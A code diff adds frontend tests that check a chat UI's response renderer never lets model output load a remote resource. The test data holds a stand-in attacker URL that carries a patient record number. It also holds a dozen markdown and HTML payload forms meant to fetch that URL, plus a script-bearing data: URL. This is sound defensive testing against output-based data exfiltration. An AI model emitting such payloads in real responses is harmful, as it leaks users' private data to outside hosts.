@@ -85,3 +85,78 @@ describe("Response — untrusted markdown is neutralized", () => {
     ).not.toThrow();
   });
 });
+
+const ATTACKER = "https://evil.test/leak.png?d=PATIENT-MRN-123";
+
+function attributesLoadingAttacker(root: ParentNode): string[] {
+  const hits: string[] = [];
+  for (const el of root.querySelectorAll("*")) {
+    for (const attr of el.getAttributeNames()) {
+      if (el.getAttribute(attr)?.includes("evil.test")) {
+        hits.push(`<${el.tagName.toLowerCase()} ${attr}>`);
+      }
+    }
+  }
+  return hits;
+}
+
+describe("Response — model output never loads a remote resource", () => {
+  const cases: Array<[string, string]> = [
+    ["markdown image", `![chart](${ATTACKER})`],
+    ["reference-style image", `![chart][r]\n\n[r]: ${ATTACKER}`],
+    ["raw <img src>", `<img src="${ATTACKER}" alt="x">`],
+    ["raw <img srcset>", `<img srcset="${ATTACKER} 1x" alt="x">`],
+    [
+      "raw <picture><source>",
+      `<picture><source srcset="${ATTACKER}"><img src="${ATTACKER}"></picture>`,
+    ],
+    [
+      "raw <video poster>",
+      `<video poster="${ATTACKER}" src="${ATTACKER}"></video>`,
+    ],
+    ["raw <audio src>", `<audio src="${ATTACKER}"></audio>`],
+    [
+      "raw <link rel=preload>",
+      `<link rel="preload" as="image" href="${ATTACKER}">`,
+    ],
+    ["raw <iframe>", `<iframe src="${ATTACKER}"></iframe>`],
+    ["raw <object>", `<object data="${ATTACKER}"></object>`],
+    ["inline style url()", `<div style="background:url(${ATTACKER})">x</div>`],
+    ["raw <style>", `<style>body{background:url(${ATTACKER})}</style>`],
+  ];
+
+  it.each(
+    cases,
+  )("%s produces no element that would load the URL", (_name, md) => {
+    const { container } = render(<Response>{md}</Response>);
+    expect(attributesLoadingAttacker(container)).toEqual([]);
+    expect(attributesLoadingAttacker(document.head)).toEqual([]);
+    expect(document.querySelector('link[rel="preload"]')).toBeNull();
+    expect(container.querySelector("style")).toBeNull();
+  });
+
+  it("shows a blocked remote image as plain text naming the image", () => {
+    const { container } = render(
+      <Response>{`![chart](${ATTACKER})`}</Response>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.textContent).toContain("chart");
+  });
+
+  it("renders a local data: image, which is how the chat shows its own screenshots", () => {
+    const dataUrl =
+      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
+    const { container } = render(<Response>{`![dot](${dataUrl})`}</Response>);
+    expect(container.querySelector("img")?.getAttribute("src")).toBe(dataUrl);
+    expect(container.textContent).not.toContain("Image blocked");
+  });
+
+  it("never renders a data: URL that is not an image", () => {
+    const { container } = render(
+      <Response>
+        {"![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"}
+      </Response>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+  });
+});
